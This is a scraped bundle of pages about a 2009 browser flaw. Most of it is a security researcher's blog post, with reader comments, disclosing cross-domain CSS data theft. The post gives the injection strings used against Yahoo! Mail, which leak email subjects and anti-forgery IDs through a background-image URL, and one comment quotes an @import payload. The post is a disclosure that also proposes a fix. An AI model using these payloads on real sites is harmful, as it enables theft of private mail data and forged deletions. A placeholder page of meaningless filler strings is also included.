 [URL](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |
  |

 [Keywords](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |InRadar

 [Depends on](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |

 [Blocks](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |

[35032](show_bug.cgi?id=35032 "RESOLVED INVALID - LayoutTests/http/tests/security/cross-origin-css.html results differ between DumpRenderTree and Safari")

Dependencies
[tree](showdependencytree.cgi?id=29820&hide_resolved=1)[graph](showdependencygraph.cgi?id=29820)

 [See Also](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |

 [Alias](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") |
None

---

* Top of Page
* [Format For Printing](show_bug.cgi?format=multiple&id=29820)
* [XML](show_bug.cgi?ctype=xml&id=29820)
* [Clone This Bug](enter_bug.cgi?cloned_bug_id=29820)

* + [New](enter_bug.cgi)
  + [Browse](describecomponents.cgi)
  + [Reports](report.cgi)
  + [Requests](request.cgi)



=== Content from code.google.com_80776903_20250125_142538.html ===



=== Content from www.vupen.com_d97b8dfd_20250125_142605.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61



=== Content from scarybeastsecurity.blogspot.com_1f83dda7_20250125_142542.html ===


# [Security](https://scarybeastsecurity.blogspot.com/)

Hacking everything, by Chris Evans / scarybeasts

## Monday, December 28, 2009

### Generic cross-browser cross-domain theft

Well, here's a nice little gem for the festive season. I like it for a few distinct reasons:

2. It's one of those cases where if you look at web standards from the correct angle, you can see a security vulnerability specified.

4. Accordingly, it affected all 5 major browsers. And likely the rest.

6. You can still be a theft victim even with plugins *and JavaScript* disabled!

It's much less serious than it could be because there are restrictions on the format of cross-domain data which can be stolen, and the attacker needs to be able to exercise limited control of the target theft page.
The issue is best introduced with an example. The example chosen is deliberately a little bit involved and not too severe. This is to give the upcoming browser updates a chance to get deployed.

**Example: Yahoo! Mail cross-domain subject line theft and e-mail deletion**

(It's important to note there is no apparent failing of the web app in question here).

* Step 1: E-mail your victim@yahoo.com with the subject line ');}

* Step 2: Wait a bit (assume that other e-mails are delivered to the victim at this time)

* Step 3: E-mail your victim@yahoo.com with the subject line {}body{background-image:url('http://google.com/ and include in the body: PLEASE CLICK <http://cevans-app.appspot.com/static/yahoocss.html>

* Step 4: Mild profit if the victim clicks the link.

If you set up the above scenario as a test, you might see something like this in an alert box upon clicking the link:
 `url(http://google.com/%3C/a%3E%3Cbr/%3E%3Cspan%20class=%22j%22%3EChris%20Evans%3C/span%3E%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20class=%22h%22%3E%3Cdiv%20class=%22i%22%3E%3Cspan%3E%3Ca%20href=%22/p/mail/messageDetail?fid=Inbox&amp;mid=1_3493_AGvHtEQAAWFgSgIzgAlWYQXHqDY&3=q%22%3ESuper%20sensitive%20subject%3C/a%3E%3Cbr/%3E%3Cspan%20class=%22j%22%3EChris%20Evans%3C/span%3E%3C/span%3E%3C/div%3E%3C/div%3E%3Cdiv%20class=%22h%22%3E%3Cdiv%20class=%22i%22%3E%3Cspan%3E%3Ca%20href=%22/p/mail/messageDetail?fid=Inbox&amp;mid=1_3933_AGTHtEQAAM%2FHSgIzawpE8Fwm1%2FI&5=x%22%3E)`
The above text is stolen cross-domain, and the interesting pieces are highlighted in bold. The data includes the subjects, senders and "mid" value for all e-mails received between the two set-up e-mails we sent the victim.
Although leaking of subjects and senders is not ideal, it's the "mid" value that interests us most as an attacker. This would *appear* to be a secure / unguessable ID. Accordingly, it is reasonable for the mail application to rely on it as a distinct anti-XSRF token. This is indeed the case for the "delete" operation, implemented as a simple HTTP GET request. Interestingly, the "forward" operation seems to have an additional anti-XSRF token in the POST body, making the "mid" leak not nearly as serious as it could have been.

That's how this whole attack proceeds in its most powerful form: leak a small amount of text cross-domain, and then bingo! if the leaked text happens to include a global anti-XSRF token.

**How does it work?**

It works by abusing the standards relating to the loading of CSS style sheets. Approximately, the standards are:

* Send cookies on any load of CSS, including cross-domain.

* When parsing the returned CSS, ignore any amount of crap leading up to a valid CSS descriptor.

By controlling a little bit of text in the victim domain, the attacker can inject what appears to be a valid CSS string. It does not matter what proceeds this CSS string: HTML, binary data, JSON, XML. The CSS parser will ruthlessly hunt down any CSS constructs within whatever blob is pulled from the victim's domain. To the CSS parser, the text in the above attack looks like this:
 `(some HTML junk; whatever){} body{background-image:url('http://google.com/%3C/a...stolen stuff...')}(some trailing HTML junk)`
So, the background of the attacker's page will be styled with a background image loaded from an URL, the path of which contains stolen data! One lovely twist of using a CSS string which is an URL is that it will be automatically fetched even if JavaScript is turned off! The stolen data is then harvested by the attacker from their web server logs.
Fortunately, there are various barriers to exploiting this:

* Any newlines in the injected string break the CSS parse. This is a very common condition which stops potentially serious attacks.

* CSS strings may be quoted within the ' or " characters. In a context where both of these are escaped (HTML escaped, URL escaped, whatever), it will not be possible to inject a CSS string.

* The attacker needs control of two injection points: pre-string and post-string. For many sensitive pages, the attacker won't have sufficient influence over the page data via URL params or reflection of attacker data.

General areas that are more susceptible to this attack include:

* JSON / XML feeds (common lack of newlines; no requirement to escape " (JSON strings) or ' (XML text nodes)).

* Socially-related websites (the victim is always browsing attacker-controlled strings such as comments on their mundane photos, etc).

**How do we fix it?**

It would be nice to be able to not send cookies for cross-domain CSS loads; however that would certainly break stuff and it's hard to measure what without actually causing the breakage.

It would be nice to be strict on the MIME type when loading CSS resources -- if not globally then at least for cross-domain loads. But this breaks high profile sites, \*cough\* configure.dell.com and text/plain \*cough\*. (To be fair, it gets much worse with many sites even using text/html, application/octet-stream, it goes on).

A good balance is to require the alleged CSS to at least start with well-formed CSS, iff it is a cross-domain load and the MIME type is broken. This is the approach I used in my pending WebKit patch.

Note that fixing this issue also fixes my previous attack of using cross-domain CSS to reliably tell if someone is logged in or not:

<http://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html>

**Credits**

* Aaron Sigel, for interesting discussions about using /\* styled multi-line comments to bypass the newline restriction. Looks like it's not possible to recover comment text but we didn't test all the browsers.

* Opera, for seemingly fixing this in v10.10 - although I don't know the exact heuristic used.

* The WebKit and Mozilla communities for good feedback on approaches and patches.

Posted by

[Chris Evans](https://www.blogger.com/profile/01004765479735675808 "author profile")

at

[6:22 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=3024470480937744884&postID=1981000830265264190&from=pencil "Edit Post")

#### 20 comments:

[![](//www.blogger.com/img/blogger_logo_round_35.png "Asirap")](https://www.blogger.com/profile/05154981292791346434)
[Asirap](https://www.blogger.com/profile/05154981292791346434)
said...

Sweet P.O.C. I'd actually be really curious how many legit pages break if you prevented cookies being sent with cross-domain CSS loads. I wouldn't expect this number to be too high, though I agree that stricter CSS validation is the better route.

[December 29, 2009 at 6:25 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262096707810#c4428102965091412592 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=4428102965091412592 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "jd")

jd
said...

Shouldn't the mimetype prevent yahoocss.html from loading the email as a stylesheet?

[December 30, 2009 at 12:11 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262203884524#c1475616280833768462 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1475616280833768462 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@jd: No, browsers will ignore the MIME type (unless they are in standards mode, but this is not a default configuration and the evil page loading the CSS can often change modes itself). The reason browsers ignore the MIME type to load CSS is that there are unfortunately a bunch of web sites out there that serve CSS with broken MIME types.

[December 30, 2009 at 12:48 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262206093284#c3902186486040029681 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3902186486040029681 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

How is it not the application's fault if the attack relies on being able to inject code? I don't see how this is any different than the traditional JavaScript injection attacks, except that this uses CSS and works with JS disabled.

What is it that developers should never trust? Oh yeah, it's user submitted data.

[December 30, 2009 at 12:51 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262206302077#c1510336961989305701 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1510336961989305701 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@Anonymous: I recommend a more careful reading of the blog post carefully. What's the bug in Yahoo! Mail? (there isn't one). We're not talking about a JavaScript injection (caused by failure to HTML escape, JS escape, etc). We're talking about making a CSS construct appear in the victim's page / feed / JSON API / etc. This uses characters such as { which remain intact even with correct escaping in the application.

[December 30, 2009 at 1:25 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262208355439#c1080148587588322832 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1080148587588322832 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

And if the injected subject line doesn't use a single or double quote, the attack doesn't work, now does it? You said it yourself:

"CSS strings may be quoted within the ' or " characters. In a context where both of these are escaped (HTML escaped, URL escaped, whatever), it will not be possible to inject a CSS string."

I don't know how I could read that any differently. Either single/double quotes are escaped properly or they aren't. If they aren't, the application is at fault, it doesn't matter what kind of application it is.

[December 30, 2009 at 1:42 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262209337455#c3519635292679139520 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3519635292679139520 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@Anonymous: ah, thanks for the clarification, now I see the bit you're missing. You do ask a good question. The HTML characters it is mandatory to escape vary depending on context. For example, inside a "-quoted HTML attribute value, you absolutely need to escape " characters. However inside of a tag, such as **hello"quote** things are different. There are similar subtleties to the escaping rules for XML and JSON, involving ' vs " that make those particularly interesting vectors too.

[December 30, 2009 at 2:02 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262210530145#c828783274969241244 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=828783274969241244 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

Ehh... my bold tag got parsed, hello"quote should be surrounded by a b tag in the example.

[December 30, 2009 at 2:03 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262210609151#c8132558347543311026 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=8132558347543311026 "Delete Comment")

[![](//resources.blogblog.com/img/blank.gif "tentacoloViola")](http://sites.google.com/site/tentacoloviola/)
[tentacoloViola](http://sites.google.com/site/tentacoloviola/)
said...

Hi Chris, kudos for your research, i've found it very interesting. However i think there is another constraint for this technique to work: http requests for css are done using GET so it is impossible to perform a cross domain theft on resources that are retrieved through POST requests. do you agree?

[January 5, 2010 at 4:09 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262693345364#c3812733780924652574 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3812733780924652574 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Chris Evans")](https://www.blogger.com/profile/01004765479735675808)
[Chris Evans](https://www.blogger.com/profile/01004765479735675808)
said...

@tentacoloViola: Yes :)

[January 5, 2010 at 8:48 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262710123571#c6487816823989185761 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=6487816823989185761 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "Isaac")](https://www.blogger.com/profile/10585942371837479099)
[Isaac](https://www.blogger.com/profile/10585942371837479099)
said...

Hey Chris, been a while ;D. This reminds me of the CSS injection bug found by a guy over here:
http://d.hatena.ne.jp/ofk/20081111/1226407593. If you can inject portions of CSS into a field and have it displayed, ie6 (maybe 7?) would parse it as valid css and allow you to read data contained in the field. for example using a css import: @import url("http://google.co.jp/search?source=ig&hl=en&rlz=&=&q={}body{font-family:");
Then you were able to read portions of the document like: alert(document.body.currentStyle.fontFamily).

[January 6, 2010 at 6:27 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1262831225912#c5586747143257811465 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=5586747143257811465 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

You could just escape characters like { to { and : to : but you shouldn't have to resort to that!

[June 18, 2010 at 10:50 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1276883405564#c4767463765271521982 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=4767463765271521982 "Delete Comment")

[![](https://resources.blogblog.com/img/blank.gif "bcdalai")
![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirUsrcYve4ETlUDix_qyo4Kg9A9RshAL8BO0TOqfpFJPv8X1-QZiOuqSN4v0xiKctFr2r2m-Eb7b7ScMxRmvkcmaOUL1p5NoHpCSQTunxMTWv3fndC3lSnCEAkYc7MPg/s45-c/bcdalai_3074_08.09.2014.jpg)](https://www.blogger.com/profile/09295142170327988483)
[bcdalai](https://www.blogger.com/profile/09295142170327988483)
said...

This is very important article for everyone and especially to me. Because I'm using many web services with networking and micro-blogging tools that often use cross-domain CSS. And Thanks to Chris Evans.

[September 7, 2010 at 10:34 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1283880860904#c6473666055878784646 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=6473666055878784646 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

Scary!
Would this "vector" be broken, if one denies "third party" cookies ?

[September 9, 2010 at 10:35 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1284053738160#c6334996253789741664 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=6334996253789741664 "Delete Comment")

[![](//resources.blogblog.com/img/blank.gif "mu")](http://www.ikariams.info/vb)
[mu](http://www.ikariams.info/vb)
said...

Scary!
Would this "vector" be broken, if one denies "third party" cookies ?

yes

[November 8, 2010 at 11:05 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1289286325587#c1924459015001973540 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1924459015001973540 "Delete Comment")

[![](//www.blogger.com/img/blogger_logo_round_35.png "James Kettle")](https://www.blogger.com/profile/03270155456684307605)
[James Kettle](https://www.blogger.com/profile/03270155456684307605)
said...

That is a brilliant technique. Thanks for sharing it. These rareish flaws stack up.

[January 4, 2011 at 11:33 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1294169605239#c2480353146752799728 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=2480353146752799728 "Delete Comment")

[![](//resources.blogblog.com/img/blank.gif "kozmic")](http://twitter.com/kozmic)
[kozmic](http://twitter.com/kozmic)
said...

You mention talking with different browser vendors, have anyone beside Opera implemented fixes? If so it would be interesting to know what approach they have taken.

[January 26, 2011 at 10:58 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1296068301215#c3358309457092217867 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=3358309457092217867 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Buge")

Buge
said...

@mu

I'm pretty sure you're wrong. Third party cookies have to do with how cookies are set.

This exploit doesn't involve setting any cookies in weird ways. It just sends the cookies in weird ways.

[October 3, 2014 at 4:21 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1412378517814#c7331155280653337712 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=7331155280653337712 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

First shouldn't "A good balance is to require the alleged CSS to at least start with well-formed CSS, iff it is a cross-domain load and the MIME type is broken." use only if instead of iff(if and only if) as that's interpreted that you may only use well formed CSS if it's cross-domain and the MIME type is broken; Which implies Presuming that iff takes precedence over 'and' that you may not use well formed CSS if it's a same domain request, else if and takes precedence over and then it implies that you may not use well formed CSS on a request which is on the same domain and has a valid MIME type. Anyway that's not too important, jut being a bit pedantic, perhaps I'm wrong.

Now my question, I know this is an old post and things may have been different back then but hasn't CSS only ever been parsed inside of a designated area such as a style tag or the style attribute, if so why would user input ever end up in there in the Yahoo email subject. The example doesn't explicitly state you added an element also from your comments it'd seem that there was no HTML injection so I don't see how that could have even been parsed as CSS instead of just plain text or rather HTML.

In addition I had to re-read the article and comments to presume you mean that the link to "http://cevans-app.appspot.com/static/yahoocss.html" will be requested and included into the document as a CSS document I fail to see how. First it's included part way through a background-image: url(); argument, the actual domain being requested should be a google.com and everything following should be part of the requested URI and not a new request which isn't much of a problem you control the initial URL anyway so you could change that to your malicious domain okay so the request is made as if to an image which could contain it's own style tags which would get parsed, but this doesn't explain why aforementioned URI is relevant. I assume you were saying that the background-img would be parsed and the XSRF tokens would be contained in the URI could be used to forge a GET request by the requested background-image URI ?

so to re-iterate why would the CSS parser pass the entire document? Isn't the entire point of the style tag/attribute to indicate where CSS exists and should be parsed from.
And why what relevance has the second link in the background-img URI?

[July 11, 2017 at 2:49 PM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1499809783636#c1136205043882262970 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1136205043882262970 "Delete Comment")

![](//resources.blogblog.com/img/blank.gif "Anonymous")

Anonymous
said...

You had me until you said "an URL".

[February 14, 2018 at 10:12 AM](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html?showComment=1518631951622#c1456039787980989734 "comment permalink")
[![](https://resources.blogblog.com/img/icon_delete13.gif)](https://www.blogger.com/delete-comment.g?blogID=3024470480937744884&postID=1456039787980989734 "Delete Comment")

[Post a Comment](https://www.blogger.com/comment/fullpage/post/3024470480937744884/1981000830265264190)

[Newer Post](https://scarybeastsecurity.blogspot.com/2010/01/logout-xsrf-significant-web-app-bug.html "Newer Post")

[Older Post](https://scarybeastsecurity.blogspot.com/2009/12/bypassing-intent-of-blocking-third.html "Older Post")

[Home](https://scarybeastsecurity.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://scarybeastsecurity.blogspot.com/feeds/1981000830265264190/comments/default)

Subscribe to my Twitter feed: [@scarybeasts](https://twitter.com/scarybeasts).

## Subscribe To ScarybeastSecurity

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://scarybeastsecurity.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2F1981000830265264190%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fscarybeastsecurity.blogspot.com%2Ffeeds%2F1981000830265264190%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://scarybeastsecurity.blogspot.com/feeds/1981000830265264190/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Comments

## Blog Archive

* ►
  [2021](https://scarybeastsecurity.blogspot.com/2021/)
  (1)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2021/05/)
    (1)

* ►
  [2020](https://scarybeastsecurity.blogspot.com/2020/)
  (7)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2020/12/)
    (1)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2020/11/)
    (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2020/07/)
    (1)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2020/06/)
    (3)
  + ►
    [April](https://scarybeastsecurity.blogspot.com/2020/04/)
    (1)

* ►
  [2017](https://scarybeastsecurity.blogspot.com/2017/)
  (10)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2017/09/)
    (1)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2017/06/)
    (1)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2017/05/)
    (7)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2017/03/)
    (1)

* ►
  [2016](https://scarybeastsecurity.blogspot.com/2016/)
  (7)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2016/12/)
    (3)
  + ►
    [November](https://scarybeastsecurity.blogspot.com/2016/11/)
    (4)

* ►
  [2015](https://scarybeastsecurity.blogspot.com/2015/)
  (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2015/07/)
    (1)

* ►
  [2014](https://scarybeastsecurity.blogspot.com/2014/)
  (5)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2014/09/)
    (2)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2014/06/)
    (1)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2014/03/)
    (1)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2014/02/)
    (1)

* ►
  [2013](https://scarybeastsecurity.blogspot.com/2013/)
  (2)
  + ►
    [December](https://scarybeastsecurity.blogspot.com/2013/12/)
    (1)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2013/02/)
    (1)

* ►
  [2012](https://scarybeastsecurity.blogspot.com/2012/)
  (9)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2012/09/)
    (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2012/07/)
    (1)
  + ►
    [April](https://scarybeastsecurity.blogspot.com/2012/04/)
    (2)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2012/03/)
    (3)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2012/02/)
    (1)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2012/01/)
    (1)

* ►
  [2011](https://scarybeastsecurity.blogspot.com/2011/)
  (10)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2011/07/)
    (1)
  + ►
    [May](https://scarybeastsecurity.blogspot.com/2011/05/)
    (2)
  + ►
    [April](https://scarybeastsecurity.blogspot.com/2011/04/)
    (1)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2011/03/)
    (3)
  + ►
    [February](https://scarybeastsecurity.blogspot.com/2011/02/)
    (2)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2011/01/)
    (1)

* ►
  [2010](https://scarybeastsecurity.blogspot.com/2010/)
  (11)
  + ►
    [October](https://scarybeastsecurity.blogspot.com/2010/10/)
    (1)
  + ►
    [September](https://scarybeastsecurity.blogspot.com/2010/09/)
    (1)
  + ►
    [August](https://scarybeastsecurity.blogspot.com/2010/08/)
    (1)
  + ►
    [July](https://scarybeastsecurity.blogspot.com/2010/07/)
    (3)
  + ►
    [June](https://scarybeastsecurity.blogspot.com/2010/06/)
    (1)
  + ►
    [March](https://scarybeastsecurity.blogspot.com/2010/03/)
    (1)
  + ►
    [January](https://scarybeastsecurity.blogspot.com/2010/01/)
    (3)

* ▼
  [2009](https://scarybeastsecurity.blogspot.com/2009/)
  (29)
  + ▼
    [December](https://scarybeastsecurity.blogspot.com/2009/12/)
    (3)
    - [Generic cross-browser cross-domain theft](https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html)
    - [Bypassing the intent of blocking "third-party" coo...](https://scarybeastsecurity.blogspot.com/2009/12/bypassing-intent-of-blocking-third.html)
    - [Cross-domain search timing](https://scarybeastsecurity.blogspot.com/2009/12/cross-domain-search-timing.html)
  + ►
